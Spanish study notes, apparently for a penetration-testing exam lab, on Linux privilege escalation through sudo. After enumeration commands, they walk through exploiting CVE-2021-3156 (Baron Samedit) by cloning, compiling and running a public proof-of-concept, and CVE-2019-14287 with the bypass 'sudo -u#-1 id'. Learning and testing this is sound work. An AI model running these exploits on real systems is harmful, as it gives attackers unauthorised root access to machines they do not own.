
## 1. Enumeración

### Comprobar permisos sudo

```
sudo -l
```

Permite identificar qué comandos puede ejecutar el usuario con privilegios elevados.

### Consultar la versión de sudo

```
sudo -V | head -n1
```

### Identificar la distribución y su versión

```
cat /etc/lsb-release
cat /etc/os-release
```

### Consultar la configuración de sudoers

```
sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
```

Revisa también los archivos incluidos desde `/etc/sudoers.d/`.

## 2. CVE-2021-3156 — Heap-Based Buffer Overflow

Vulnerabilidad de escalada de privilegios en `sudo`, conocida como **Baron Samedit**. Afecta a determinadas versiones vulnerables y permite obtener una shell como `root`.

### Comprobar la versión

```
sudo -V | head -n1
```

### Descargar y compilar el PoC

```
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
```

### Ejecutar el exploit

```
./sudo-hax-me-a-sandwich
```

El programa muestra los objetivos disponibles. Comprueba la distribución y la versión del sistema:

```
cat /etc/lsb-release
```

Selecciona el identificador correspondiente al entorno vulnerable. Ejemplo del módulo para Ubuntu 20.04.1:

```
./sudo-hax-me-a-sandwich 1
```

### Comprobar la escalada

```
id
```

Si la explotación funciona, deberías obtener `uid=0(root)`.

**Importante:** la versión por sí sola no garantiza la vulnerabilidad; las distribuciones pueden aplicar parches sin cambiar la versión principal de forma evidente.

## 3. CVE-2019-14287 — Sudo Policy Bypass

Vulnerabilidad que permitía eludir determinadas restricciones de `sudo` en versiones vulnerables anteriores a la 1.8.28.

### Requisito

El usuario debe tener permitido ejecutar algún comando mediante `sudo`, con una configuración susceptible a este bypass.

### Enumerar permisos

```
sudo -l
```

Ejemplo:

```
User cry0l1t3 may run the following commands:
    ALL=(ALL) /usr/bin/id
```

### Consultar el UID del usuario

```
id
grep "^$(whoami):" /etc/passwd
```

### Explotar el bypass

En el escenario vulnerable del módulo, se puede intentar ejecutar el comando permitido con el UID `-1`:

```
sudo -u#-1 id
```

Si funciona, la salida mostrará `uid=0(root)`.

**Importante:** este bypass no funciona en versiones corregidas ni con cualquier configuración de `sudoers`.

## 4. Checklist para el examen

1. Ejecutar `sudo -l` para enumerar permisos.
    
2. Comprobar la versión con `sudo -V`.
    
3. Identificar el sistema con `cat /etc/os-release`.
    
4. Buscar CVE aplicables a la versión y configuración detectadas.
    
5. Si existe una vulnerabilidad conocida, comprobar sus requisitos antes de ejecutar el PoC.
    
6. Verificar la escalada con `id`.
    
7. Una vez obtenida la shell privilegiada, localizar y leer la flag correspondiente.
